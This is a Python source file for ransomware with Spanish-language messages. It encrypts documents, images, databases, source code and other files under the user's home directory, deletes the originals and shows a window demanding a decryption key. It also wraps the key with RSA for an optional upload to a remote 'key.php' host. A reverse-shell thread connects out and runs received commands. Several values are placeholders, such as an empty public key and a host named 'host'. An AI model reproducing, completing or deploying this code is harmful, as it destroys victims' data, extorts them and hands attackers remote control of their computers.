import os
import sys
import requests
import threading
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import socket
import subprocess
import time
import base64
from cryptography.hazmat.primitives.asymmetric import rsa, padding # type: ignore
from cryptography.hazmat.primitives import hashes # type: ignore
from cryptography.hazmat.primitives.serialization import load_pem_public_key # type: ignore

User_PC = os.path.expanduser('~')
Desc = '!!Your Data has been Encrypted!!'
key = Fernet.generate_key()
host_validation = False
host = 'host'
rhost = host + '/key.php'
HOST = '0.0.0.0'
PORT = 8080
int_port = int(PORT)
# Public RSA key
public_key_pem = None

# Load RSA key
public_key = load_pem_public_key(public_key_pem)

file_extensions = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt',
    '.odt', '.ods', '.odp', '.rtf', '.csv', '.xml',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.webp',
    '.ico', '.svg', '.heic',
    '.mp3', '.wav', '.aac', '.ogg', '.flac', '.mp4', '.avi', '.mov',
    '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    '.sql', '.db', '.mdb', '.sqlite', '.dbf',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
    '.c', '.cpp', '.h', '.java', '.py', '.rb', '.js', '.php', '.html', '.css',
    '.sql', '.pl', '.sh', '.bat', '.ts', '.go', '.swift', '.r', '.scala',
    '.ini', '.cfg', '.conf', '.log', '.env', '.yaml', '.yml',
    '.plist', '.desktop', '.system',
    '.json', '.xml', '.yaml', '.yml', '.md', '.tex', '.nfo', '.epub',
    '.mobi', '.chm', '.iso', '.dmg', '.img', '.apk', '.bin',
    '.ai', '.eps', '.psd', '.indd', '.svg',
    '.key', '.odp', '.gdoc', '.gsheet', '.gslides'
]


#---------------------------------------------Funciones--------------------------------------------------------
def capture_key():
    def decrypt_file(file_path, key):
        if not file_path.endswith(".zlo"):
            return

        try:
            f = Fernet(key)
            with open(file_path, "rb") as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            decrypted_file_path = file_path[:-4]  # Eliminar la extensi√≥n .zlo
            with open(decrypted_file_path, "wb") as file:
                file.write(decrypted_data)
            os.remove(file_path)

        except Exception as e:
            print(f'Error en descifrado: {e}')

    dkey = entry.get().encode()
    if len(dkey) != 44:
        messagebox.showerror('Error', 'Clave invalida. La longitud de la clave debe ser de 44 caracteres.')
        return

    for root, dirs, files in os.walk(User_PC):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                try:
                    decrypt_file(file_path, dkey)
                except Exception as e:
                    messagebox.showerror('Error', f'Error al descifrar: {e}')
                    return
    root.destroy()
    sys.exit()

def advertencia():
    global entry, root
    root = tk.Tk()
    root.title("Tus archivos fueron encriptados")

    main = tk.Label(root, text=Desc)
    main.pack(pady=10)

    entry = tk.Entry(root, width=40)
    entry.pack(pady=5)
    entry.bind('<Return>', lambda event: capture_key())

    accept_button = tk.Button(root, text="Aceptar", command=capture_key)
    accept_button.pack(pady=10)

    root.mainloop()

def encrypt_file(root_dir, key):
    for root, dirs, files in os.walk(root_dir):
        if 'AppData' in root:
            continue
        for file in files:
            file_path = os.path.join(root, file)
            if any(file_path.endswith(ext) for ext in file_extensions):
                try:
                    f = Fernet(key)
                    with open(file_path, "rb") as file:
                        file_data = file.read()
                    encrypted_data = f.encrypt(file_data)
                    encrypted_file_path = file_path + ".zlo"
                    with open(encrypted_file_path, "wb") as file:
                        file.write(encrypted_data)
                    os.remove(file_path)

                except Exception as e:
                    print(f'Error en cifrado: {e}')

def reverse_shell(HOST, PORT):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.send(str.encode("[*] Connection Established!\n", 'utf-8'))

            while True:
                try:
                    s.send(str.encode(os.getcwd() + "> ", 'utf-8'))
                    data = s.recv(1024).decode('utf-8').strip()

                    if data.lower() == "quit":
                        break

                    elif data.startswith("cd"):
                        try:
                            path = data[3:].strip()
                            if path == "" or path == "~":
                                os.chdir(os.path.expanduser("~"))
                            elif path == ".." or path == "../":
                                os.chdir("..")
                            else:
                                os.chdir(path)
                            s.send(str.encode("Directory changed to: " + os.getcwd() + "\n", 'utf-8'))
                        except Exception as e:
                            s.send(str.encode(f"Error changing directory: {str(e)}\n", 'utf-8'))
                    
                    else:
                        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_value, stderr_value = proc.communicate()
                        output_str = stdout_value.decode('cp437') + stderr_value.decode('cp437')
                        s.send(str.encode(output_str + os.getcwd() + "> ", 'utf-8'))
                
                except Exception as e:
                    s.send(str.encode(f"Error executing command: {str(e)}\n", 'utf-8'))
                    break
            
            s.close()
        
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(5)
            continue

#--------------------------------------------------------------------------------------------------------------
try:
    encrypted_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
except Exception as e:
    sys.exit()

if host_validation:
    parametros = {'key': base64.urlsafe_b64decode(encrypted_key).decode('utf-8')}
    response = requests.get(rhost, params=parametros)
    if response.status_code == 200:
        pass
    else:
        sys.exit()

t = threading.Thread(target=encrypt_file, args=(User_PC, key))
r = threading.Thread(target=reverse_shell, args=(HOST, int_port))
t.start()
r.start()

advertencia()

t.join()
r.join()
